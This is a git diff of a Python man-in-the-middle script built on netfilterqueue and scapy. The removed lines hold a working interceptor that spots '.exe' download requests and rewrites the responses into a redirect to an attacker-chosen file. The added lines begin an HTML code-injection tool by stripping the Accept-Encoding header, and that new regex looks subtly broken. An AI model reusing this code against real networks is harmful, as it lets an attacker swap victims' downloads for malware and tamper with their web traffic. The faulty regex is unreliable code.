@@ -1,14 +1,13 @@
 #!/usr/bin/env python3
 
 # @Author - Avish Dhirawat
-# Date - 16/08/2020
+# Date - 07/10/2020
 
 import netfilterqueue
 import subprocess
 import scapy.all as scapy
 import argparse
-
-ack_list = []
+import re
 
 def get_arguments(): # Function to get arguments in command line
     parser = argparse.ArgumentParser()
@@ -22,33 +21,17 @@ def get_arguments(): # Function to get arguments in command line
     else:
         return options
 
-def set_load(packet, load):
-    packet[scapy.Raw].load = load
-    del packet[scapy.IP].len
-    del packet[scapy.IP].chksum
-    del packet[scapy.TCP].chksum
-    # print scapy_packet.show()
-    return packet
-
 def process_packet(packet):
     scapy_packet = scapy.IP(packet.get_payload())
     if scapy_packet.haslayer(scapy.Raw):
         if scapy_packet[scapy.TCP].dport == 80:
             #print "{+} HTTP Request > \n"
-            if ".exe" in str(scapy_packet[scapy.Raw].load):
-                print("[+] exe Request")
-                ack_list.append(scapy_packet[scapy.TCP].ack)
-                #print scapy_packet.show()
+            print("[+] HTTP Request ")
+            # print(scapy_packet.show())
+            # Substituting the Accept-Encoding part to get plain HTML Code
+            modified_load = re.sub("Accept-Encoding:*?\\r\\n", "", scapy_packet[scapy.Raw].load)
         elif scapy_packet[scapy.TCP].sport == 80:
-            if scapy_packet[scapy.TCP].seq in ack_list:
-                ack_list.remove(scapy_packet[scapy.TCP].seq)
-                print("[+] Replacing file")
-
-                load = "HTTP/1.1 301 Moved Permanently\nLocation: " + str(replace_download_link) + "\n\n"
-                modified_packet = set_load(scapy_packet, load)
-                packet.set_payload(bytes(modified_packet))
-                print("[+] File replaced")
-
+            print("[+] HTTP Response")
     packet.accept()
 
 try:
